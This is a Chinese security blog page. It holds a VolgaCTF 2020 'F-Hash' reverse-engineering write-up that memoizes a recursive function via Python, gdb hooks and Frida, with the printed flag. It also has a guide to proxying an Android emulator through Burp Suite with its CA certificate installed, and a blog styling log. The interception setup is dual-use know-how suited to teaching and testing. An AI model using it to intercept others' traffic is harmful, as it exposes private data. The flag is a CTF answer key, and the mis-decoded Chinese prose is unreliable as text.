            <p>é€™é¡Œçµ¦äº†ä¸€å€‹ x86-64 ELF Executableï¼Œç›´æ¥è·‘ä¸‹å»è·‘ä¸å‡ºä¾†ï¼Œä¸€ç›´å¡åœ¨é‚£è£¡ï¼Œé€†å‘ä¸€ä¸‹æœƒç™¼ç¾ <code>13B0</code> é€™å€‹å‡½å¼æ˜¯ä¸€å€‹éè¿´å‡½å¼ï¼Œä»–çš„è™›æ“¬ç¢¼å¤§æ¦‚é•·ä¸‹é¢é€™æ¨£ï¼Œæœƒä¸€ç›´éè¿´å‘¼å«å‰å…©å±¤çš„ç­”æ¡ˆï¼Œå¾ˆæ˜é¡¯çš„æœ‰å¾ˆå¤šé‡è¤‡çš„å­å•é¡Œï¼Œé€™æ™‚å€™å°±æ˜¯è¦ç”¨ Dynamic Programming çš„æ€è·¯ä¾†æŠŠç®—éçš„ç­”æ¡ˆè¨˜ä¸‹ä¾†å°±ä¸æœƒè·‘é‚£éº¼ä¹…äº†ï¼Œæ‰€ä»¥é€™é¡Œå°±æ˜¯è¦å„ªåŒ–é€™å€‹å‡½å¼ï¼ŒæŠŠç¨‹å¼è·‘å®Œå°±æœƒå°å‡º flagã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_13B0</span><span class="params">(depth, a, b)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    r1 = _13B0(depth - <span class="number">1</span>, a, b)</span><br><span class="line">    r2 = _13B0(depth - <span class="number">2</span>, a, b)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸‹æä¾›ä¸‰ç¨®è§£æ³•ï¼Œè®€è€…å¯ä»¥è·Ÿè‘—ç·´ç¿’ä¸€ä¸‹ã€‚</p>
<h2 id="Rewrite-Function-with-Python"><a class="header-anchor" href="#Rewrite-Function-with-Python"></a>Rewrite Function with Python</h2>
<p>æœ€ç›´è¦ºçš„æ–¹æ³•å°±æ˜¯æŠŠ IDA decompile å‡ºä¾†çš„ code æ¬åˆ° python ä¸Šé‡å¯«ä¸€ä¸‹ï¼Œæ²’ä»€éº¼æŠ€è¡“ï¼Œé€™æ˜¯æˆ‘åœ¨è³½ä¸­ç”¨çš„æ–¹æ³•ï¼Œä½†å°±æ˜¯è¦æ³¨æ„ä¸€ä¸‹å‹æ…‹çš„å•é¡Œï¼Œæ¯”å¦‚å…©å€‹ unsigned int ç›¸ä¹˜å¯èƒ½ overflow åœ¨ python è£¡é¢è¦ <code>mod (1 &lt;&lt; 32)</code>ï¼Œæ›´å¤šç´°ç¯€è«‹çœ‹ä¸‹é¢çš„ç¨‹å¼ç¢¼ã€‚</p>
<figure class="highlight python"><figcaption><span>solve-rewrite.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    table += [i * <span class="number">10</span> + <span class="number">1</span> + (<span class="number">0xf6</span> &lt;&lt; <span class="number">120</span>)] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitcountsum</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    a %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    b %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> bin(a).count(<span class="string">'1'</span>) + bin(b).count(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(a, b, depth = <span class="number">256</span>)</span>:</span></span><br><span class="line">    ans = [<span class="number">0</span>]</span><br><span class="line">    ans.append((bitcountsum(a, b), <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    ans.append((bitcountsum(a ^ <span class="number">1</span>, b), <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, depth + <span class="number">1</span>):</span><br><span class="line">        v15, v16 = ans[i - <span class="number">1</span>], ans[i - <span class="number">2</span>]</span><br><span class="line">        v13 = ((v15[<span class="number">0</span>] + v15[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + (v16[<span class="number">0</span>] + v16[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + bitcountsum((v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) ^ a, b)) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        v14 = table[i]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) &gt; (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) == (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">if</span> v14 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) &gt;= v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            k = max(<span class="number">1</span>, (v13 &gt;&gt; <span class="number">64</span>) // (v14 &gt;&gt; <span class="number">64</span>))</span><br><span class="line">            v13 = (v13 - k * v14) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        ans.append((v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>), (v13 &gt;&gt; <span class="number">64</span>), (v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)))</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">al = [<span class="number">0x6369757120656854</span>, <span class="number">0x706d756a20786f66</span>, <span class="number">0x20797a616c206568</span>, <span class="number">0</span>]</span><br><span class="line">bl = [<span class="number">0x206e776f7262206b</span>, <span class="number">0x74207265766f2073</span>, <span class="number">0x80676f64</span>, <span class="number">0x2b</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> zip(al, bl):</span><br><span class="line">    print(list(map(hex, calc(a, b)[<span class="number">256</span>])))</span><br></pre></td></tr></table></figure>
<h2 id="GDB"><a class="header-anchor" href="#GDB"></a>GDB</h2>
<p>å¦ä¸€å€‹æ–¹æ³•æ˜¯æˆ‘åœ¨è³½å¾Œçœ‹ <a href="https://pastebin.com/Dj6wteXk">åˆ¥äºº</a> ç”¨çš„ï¼Œåœ¨ gdb å¯« python å» hook <code>13B0</code> çš„é–‹é ­å’Œçµå°¾ï¼Œåœ¨é–‹é ­åˆ¤æ–·é€™çµ„åƒæ•¸æœ‰æ²’æœ‰å‡ºç¾éäº†ï¼Œè·‘éå°±æŠŠåƒæ•¸çš„ <code>depth</code> è¨­æˆ 1 ä¹Ÿå°±æ˜¯ base case è®“ä»–ä¸è¦å†å¾€ä¸‹éè¿´äº†ï¼Œè€Œå› ç‚ºåŒä¸€çµ„å‡½å¼çš„ <code>Start, End</code> Hook æ²’è¾¦æ³•å…±äº«è³‡è¨Šï¼Œæ‰€ä»¥éœ€è¦ç¶­è­·ä¸€å€‹ <code>state</code> ä¾†æ”¾ç›®å‰çš„åƒæ•¸ï¼Œåœ¨çµå°¾çš„æ™‚å€™ä¸€æ¨£æ˜¯çœ‹é€™çµ„åƒæ•¸æœ‰æ²’æœ‰å‡ºç¾éï¼Œæœ‰å°±æŠŠç­”æ¡ˆå¯«ä¸Šå»ï¼Œæ²’æœ‰å°±æŠŠç­”æ¡ˆå­˜èµ·ä¾†ä¸‹æ¬¡å°±ä¸æœƒå†è·‘ä¸€æ¬¡äº†ã€‚</p>
<figure class="highlight python"><figcaption><span>solve-gdb.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(gdb.parse_and_eval(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(address, size)</span>:</span></span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> inf.read_memory(address, size).tobytes()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(address, buf)</span>:</span></span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    inf.write_memory(address, buf)</span><br><span class="line"></span><br><span class="line">memory = &#123;&#125;</span><br><span class="line">state = []</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span><span class="params">(gdb.Breakpoint)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, location)</span>:</span></span><br><span class="line">        super(Start, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">        state.append((register(<span class="string">'$rdi'</span>), register(<span class="string">'$rsi'</span>), register(<span class="string">'$rdx'</span>), register(<span class="string">'$rcx'</span>)))</span><br><span class="line">        <span class="keyword">if</span> memory.get(state[<span class="number">-1</span>][<span class="number">1</span>:]) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            gdb.execute(<span class="string">'set $rsi = 1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">End</span><span class="params">(gdb.Breakpoint)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, location)</span>:</span></span><br><span class="line">        super(End, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> state</span><br><span class="line">        buf, h = state[<span class="number">-1</span>][<span class="number">0</span>], state[<span class="number">-1</span>][<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> memory.get(h) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            memory[h] = (read(buf, <span class="number">8</span>), read(buf + <span class="number">8</span>, <span class="number">8</span>), read(buf + <span class="number">16</span>, <span class="number">8</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            write(buf, memory[h][<span class="number">0</span>])</span><br><span class="line">            write(buf + <span class="number">8</span>, memory[h][<span class="number">1</span>])</span><br><span class="line">            write(buf + <span class="number">16</span>, memory[h][<span class="number">2</span>])</span><br><span class="line">        state = state[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">Start(<span class="string">f'*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x13b0</span>&#125;</span>'</span>)</span><br><span class="line">End(<span class="string">f'*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x1424</span>&#125;</span>'</span>)</span><br></pre></td></tr></table></figure>
<p><code>gdb f-hash</code> ä¹‹å¾Œï¼Œåœ¨ gdb è£¡é¢åŸ·è¡Œ <code>source solve-gdb.py</code> å°±å¯ä»¥è·‘ä¸Šé¢çš„ç¨‹å¼ç¢¼äº†<br>
æˆ–æ˜¯ä¹Ÿå¯ä»¥åœ¨åŸ·è¡Œ gdb çš„æ™‚å€™å°±è¼‰å…¥ <code>gdb -x solve-gdb.py f-hash</code></p>
<h2 id="Frida"><a class="header-anchor" href="#Frida"></a>Frida</h2>
<p>é€™å€‹æ–¹æ³•ä¹Ÿæ˜¯æˆ‘è³½å¾Œçœ‹ <a href="https://sectt.github.io/writeups/Volga20/f-hash/README">åˆ¥äºº</a> ç”¨çš„ï¼Œfrida çœŸçš„æ˜¯å¥½æ±è¥¿ï¼Œä¹‹å‰å‰›å¥½æœ‰ç ”ç©¶ä¸€é» fridaï¼Œç¬¬ä¸€æ¬¡ç”¨åœ¨æ¯”è³½ä¸­ï¼ŒåŸºæœ¬ä¸Šè·Ÿå‰ä¸€å€‹è§£æ³•ä¸€æ¨£å» hook å‡½å¼çš„é–‹é ­å’Œçµå°¾ï¼Œä¸é frida åˆæ›´æ–¹ä¾¿äº†ï¼Œè«‹çœ‹ä¸‹é¢ç¨‹å¼ç¢¼ã€‚</p>
<figure class="highlight javascript"><figcaption><span>solve-frida.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base = ptr(Process.enumerateModulesSync()[<span class="number">0</span>].base)</span><br><span class="line"><span class="keyword">var</span> recursive_func_ptr = base.add(<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mem = &#123;&#125;</span><br><span class="line">Interceptor.attach(recursive_func_ptr, &#123;</span><br><span class="line">    onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = args[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">this</span>.hash = args[<span class="number">1</span>] + <span class="string">'-'</span> + args[<span class="number">2</span>] + <span class="string">'-'</span> + args[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="keyword">this</span>.hash] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            args[<span class="number">1</span>] = ptr(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="keyword">this</span>.hash] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            mem[<span class="keyword">this</span>.hash] = [<span class="keyword">this</span>.buf.readU64(), <span class="keyword">this</span>.buf.add(<span class="number">8</span>).readU64(), <span class="keyword">this</span>.buf.add(<span class="number">16</span>).readU64()]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.buf.writeU64(mem[<span class="keyword">this</span>.hash][<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">this</span>.buf.add(<span class="number">8</span>).writeU64(mem[<span class="keyword">this</span>.hash][<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">this</span>.buf.add(<span class="number">16</span>).writeU64(mem[<span class="keyword">this</span>.hash][<span class="number">2</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>æœ€å¾ŒåŸ·è¡Œ <code>frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash</code> å°±å¯ä»¥äº†</p>
<h2 id="Flag"><a class="header-anchor" href="#Flag"></a>Flag</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;16011432ba16efc8dcf779477985b3b9&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a href="https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash">https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash</a></li>
<li><a href="https://pastebin.com/Dj6wteXk">https://pastebin.com/Dj6wteXk</a></li>
<li><a href="https://sectt.github.io/writeups/Volga20/f-hash/README">https://sectt.github.io/writeups/Volga20/f-hash/README</a></li>
</ol>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/05/04/security/writeups/f-hash/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-03-18T12:31:14.000Z">2020-03-18</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/reverse/">reverse</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    5 minutes read (About 760 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/03/18/security/reverse/android-proxy/">ã€å®‰å“é€†å‘ã€‘é€é Burp Suite Proxy å¤œç¥æ¨¡æ“¬å™¨</a>
            
        </h1>
        <div class="content">
            <h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€"></a>å‰è¨€</h2>
<p>åœ¨ä¸Šä¸€ç¯‡ adb çš„ç’°å¢ƒä½ˆç½®ä¸­ï¼Œæˆ‘å€‘æ˜¯ç”¨ Android Emulatorï¼Œä½†æˆ‘æƒ³è¦ reverse çš„ app åªæœ‰æ”¯æ´ arm ( è »å¤š app éƒ½æ²’æœ‰æ”¯æ´ x86-64 çš„ )ï¼Œè€Œåœ¨æˆ‘ x86-64 æ©Ÿå™¨ä¸Šçš„ Android Emulator ä¸Šé–‹ arm çš„è™›æ“¬æ©Ÿå¾ˆæ…¢ï¼Œæ‰€ä»¥æˆ‘å°±æ›ç”¨äº† Nox Playerï¼Œä»–åŒæ™‚æ”¯æ´ arm è·Ÿ x86-64 çš„æ¶æ§‹ï¼Œé€Ÿåº¦ä¹ŸæŒºå¿«çš„ã€‚</p>
<p>æ©ç­‰ç­‰ï¼Œæˆ‘å‰›å‰›æ‰ç™¼ç¾åŸä¾† Nox Player æ˜¯åœ¨ VirtualBox ä¸Šé¢é–‹ä¸€å°è™›æ“¬æ©Ÿè·‘ï¼Œå‚»çœ¼ã€‚</p>
<details class="admonition question" open><summary>æ€éº¼çŸ¥é“é€™å€‹ app æ”¯æ´ä»€éº¼</summary><p><p>ç”¨ apktool è§£é–‹ apk æª”å¾Œï¼Œçœ‹ <code>/lib</code> è³‡æ–™å¤¾ä¸‹é¢æœ‰å“ªäº›è³‡æ–™å¤¾ï¼Œå¯èƒ½æœƒæœ‰ <code>arm64-v8a</code>ã€<code>armeabi-v7a</code>ã€<code>x86</code>ã€<code>x86_64</code> ç­‰ï¼Œé€™äº›å°±æ˜¯é€™å€‹ app ç”¨åˆ°çš„å‡½å¼åº«ï¼Œæ²’æœ‰å°æ‡‰æ¶æ§‹çš„å‡½å¼åº«ç•¶ç„¶å°±æ˜¯ä¸æ”¯æ´äº†ï¼Œæˆ–è€…æœ‰äº› app æœƒå°‡æ¯å€‹æ¶æ§‹åˆ†é–‹ç™¼ä½ˆï¼Œåªè¦å»ä¸‹è¼‰å°æ‡‰æ¶æ§‹çš„ app å°±å¯ä»¥äº†ã€‚</p>
</p></details>
<details class="admonition question" open><summary>adb æ€éº¼é€£ä¸Šå¤œç¥æ¨¡æ“¬å™¨</summary><p><p>å¤œç¥æ¨¡æ“¬å™¨é è¨­æœƒæŠŠ adb server é–‹åœ¨ port 62001, 62025, 62026, â€¦ ( æˆ‘ä¸çŸ¥é“ç‚ºä»€éº½ 62001 ç›´æ¥è·³åˆ° 62025 )<br>
æ‰€ä»¥ <code>adb connect localhost:62001</code> å°±å¯ä»¥å•¦</p>
</p></details>
<h2 id="Drony"><a class="header-anchor" href="#Drony"></a><a href="https://apkpure.com/tw/drony/org.sandroproxy.drony">Drony</a></h2>
<p>ä¸»è¦æ˜¯åƒè€ƒé€™ç¯‡ <a href="https://king-sabri.net/android-hacking-setup-global-proxy-for-all-apps-in-android-without-root-with-burp-suite/">Android Hacking | Setup Global Proxy for All Apps in Android (without root) with Burp Suite<br>
</a> çš„æ•™å­¸ï¼Œåœ¨ä½¿ç”¨ Drony å‰ï¼Œæˆ‘é‚„æœ‰ç”¨éå¦ä¸€æ¬¾å« ProxyDroidï¼Œä¸éæ²’æˆåŠŸï¼Œä¸çŸ¥é“å‡ºäº†ä»€éº¼äº‹ã€‚</p>
<p>åŸºæœ¬æµç¨‹æ˜¯é€™æ¨£çš„ï¼Œå› ç‚º Drony æœ¬èº«ä¹Ÿæ˜¯ä¸€å€‹ proxy serverï¼Œæ‰€ä»¥è¦å…ˆåœ¨ Android çš„è¨­å®šä¸­å°‡ proxy å°å‘åˆ° Dronyï¼Œç„¶å¾Œåœ¨ Drony çš„è¨­å®šä¸­å°‡ proxy å°å‘ä¸»æ©Ÿçš„ Burp Suiteã€‚</p>
<h3 id="ç¬¬ä¸€æ­¥"><a class="header-anchor" href="#ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h3>
<p>æ‰“é–‹ Android çš„è¨­å®šï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é»<br>
è¨­å®š &gt; ç„¡é™èˆ‡ç¶²è·¯ &gt; Wi-Fi &gt; ä½ çš„ Wi-FI çš„åå­— ( é•·æŒ‰ä»– ) &gt; ä¿®æ”¹ç¶²è·¯ &gt; é¡¯ç¤ºé€²éšé¸é … &gt; Proxy ( æ‰‹å‹• )<br>
ä¸»æ©Ÿåç¨±å¡« 127.0.0.1ï¼Œé€šè¨ŠåŸ å¡« 8020 ( Drony é è¨­çš„é€šè¨ŠåŸ  )</p>
<h3 id="ç¬¬äºŒæ­¥"><a class="header-anchor" href="#ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h3>
<p>æ‰“é–‹ Drony çš„è¨­ç½®ï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é»<br>
è¨­ç½® &gt; ç¶²è·¯ &gt; ç„¡ç·šç¶²è·¯ &gt; ä½ çš„ Wi-FI çš„åå­—<br>
ä»£ç†é¡å‹é¸æ‰‹å†Š ( ä¹Ÿå°±æ˜¯ Manualï¼ŒçœŸçˆ›çš„ç¿»è­¯ )ï¼Œä¸»æ©Ÿåç¨±å¡«ä¸»æ©Ÿçš„ ipï¼Œé€šè¨ŠåŸ å¡« 8080 ( Burp Suite é è¨­çš„é€šè¨ŠåŸ  )</p>
<details class="admonition question" open><summary>æ€éº¼æ‰¾ä¸»æ©Ÿçš„ ip</summary><p><p>ä¸»æ©ŸåŸºæœ¬ä¸Šæœƒæ˜¯ Nox Player çš„ default gateway ( å…¶å¯¦å°±æ˜¯åœ¨ VirtualBox çš„ NAT Mode )ï¼Œæ‰€ä»¥ä¸‹ <code>adb shell ip route show</code> æ‰¾åˆ° default gateway å°±æ˜¯ä¸»æ©Ÿçš„ ip äº†</p>
</p></details>
<h3 id="å®Œæˆ"><a class="header-anchor" href="#å®Œæˆ"></a>å®Œæˆ</h3>
<p>é€™æ¨£å°±è¨­å®šå¥½å•¦ï¼Œåœ¨æ—¥èªŒé é¢æŠŠé–‹é—œæ‰“é–‹å°±å¯ä»¥äº†ã€‚</p>
<h2 id="Burp-Suite-æ†‘è­‰å®‰è£"><a class="header-anchor" href="#Burp-Suite-æ†‘è­‰å®‰è£"></a>Burp Suite æ†‘è­‰å®‰è£</h2>
<p>é †ä¾¿å®‰è£ä¸€ä¸‹ Burp Suite çš„æ†‘è­‰ï¼Œé€™æ¨£å°±ä¸æœƒä¸€ç›´è·³æ†‘è­‰å•é¡Œäº†<br>
å…ˆåˆ° <a href="http://burp">http://burp</a> ä¸‹è¼‰ Burp Suite çš„æ†‘è­‰ï¼Œè¼‰ä¸‹ä¾†æ˜¯ der å‰¯æª”åçš„è©±ï¼Œå…ˆæŠŠä»–æ”¹åæˆ cer å‰¯æª”åçµå°¾<br>
æ‰“é–‹ Android çš„è¨­å®šï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é»<br>
è¨­å®š &gt; å€‹äºº &gt; å®‰å…¨æ€§ &gt; æ†‘è­‰å„²å­˜ç©ºé–“ &gt; å¾ SD å¡å®‰è£ ( é¸ cacert.cer )<br>
å®‰è£çš„æ™‚å€™ä»–æœƒå«ä½ è¨­å®šä¸€ä¸‹ PIN ç¢¼</p>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2020/03/18/security/reverse/android-proxy/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2020-02-21T20:26:30.000Z">2020-02-22</time>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    2 minutes read (About 347 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2020/02/22/blog02/">ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x02</a>
            
        </h1>
        <div class="content">
            <h2 id="Admonition"><a class="header-anchor" href="#Admonition"></a>Admonition</h2>
<p>æˆ‘æŠŠ <a href="https://squidfunk.github.io/mkdocs-material/extensions/admonition/">Material for MkDocs - Admonition Extension</a> æ¬éä¾†å•¦ï¼Œå› ç‚ºå¯¦åœ¨å¤ªå¥½çœ‹ï¼Œå°±æ¬éä¾†ç”¨äº†ï¼Œä¸¦ä¸”åšäº†ä¸‹é¢å…©å€‹å°æ”¹å‹•</p>
<ol>
<li>æŠŠ <code>border-radius</code> æ‹”æ‰äº†ï¼Œé‚„æ˜¯æ–¹çš„å¥½çœ‹</li>
<li>é™°å½±æ”¹æ·¡äº†ï¼Œæ„Ÿè¦ºæ¯”è¼ƒå°</li>
</ol>
<details class="admonition example" open><summary>example</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition note" open><summary>note</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition abstract" open><summary>abstract</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition info" open><summary>info</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition tip" open><summary>tip</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition success" open><summary>success</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition question" open><summary>question</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition warning" open><summary>warning</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition failure" open><summary>failure</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition danger" open><summary>danger</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition quote" open><summary>quote</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<h3 id="å¯¦ä½œ"><a class="header-anchor" href="#å¯¦ä½œ"></a>å¯¦ä½œ</h3>
<p>å¾ <a href="https://github.com/haishanh/hexo-tag-admonition">hexo-tag-admonition</a> å€Ÿ code éä¾†æ”¹<br>
